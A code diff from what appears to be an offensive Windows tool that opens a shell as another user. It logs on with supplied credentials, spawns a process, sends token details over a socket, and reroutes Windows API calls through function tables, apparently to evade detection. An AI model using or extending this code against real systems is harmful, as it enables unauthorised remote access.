@@ -3,8 +3,6 @@
 #include <stdio.h>
 #include <userenv.h>
 #include <Lmcons.h>
-#include <iphlpapi.h>   // IPAddr
-#include <ws2tcpip.h>   // inet_pton
 
 #include "MgArguments.h"
 #include "Tools.h"
@@ -43,20 +41,7 @@ BOOL runAS(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, LPCWS
         printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail LogonUser");
     return retVal;
 }
-
-SOCKADDR_IN InitSockAddr(char* ipAddress, int port) {
-    SOCKADDR_IN ssin;
-    IPAddr ipAddressF;
-
-    if (inet_pton(AF_INET, ipAddress, &ipAddressF)) {
-        memset(&ssin, 0, sizeof(SOCKADDR_IN));
-        ssin.sin_family = AF_INET;
-        ssin.sin_addr.s_addr = ipAddressF;
-        ssin.sin_port = htons(port);
-    }
-    return ssin;
-}
-BOOL RunShellAs(Arguments listAgrument) {
+BOOL RunShellAs(Kernel32_API kernel32, Advapi32_API advapi32, Arguments listAgrument) {
     BOOL exitPorcess = FALSE;
     SOCKADDR_IN sAddr;
 
@@ -91,12 +76,12 @@ BOOL RunShellAs(Arguments listAgrument) {
                 retVal = runAS(listAgrument.lpszUsername, listAgrument.lpszDomain, listAgrument.lpszPassword,
                     listAgrument.Process, StartupInfo, &ProcessInfo, &hToken);
 
-                SendInitInfo(mySocket, hToken);
+                SendInitInfo(kernel32, advapi32,mySocket, hToken);
                 if (retVal == 0) {
                     WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
                     printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process shutdown !\n");
-                    CloseHandle(ProcessInfo.hProcess);
-                    CloseHandle(ProcessInfo.hThread);
+                    kernel32.CloseHandleF(ProcessInfo.hProcess);
+                    kernel32.CloseHandleF(ProcessInfo.hThread);
                 }else
                     exitPorcess = TRUE;
             }
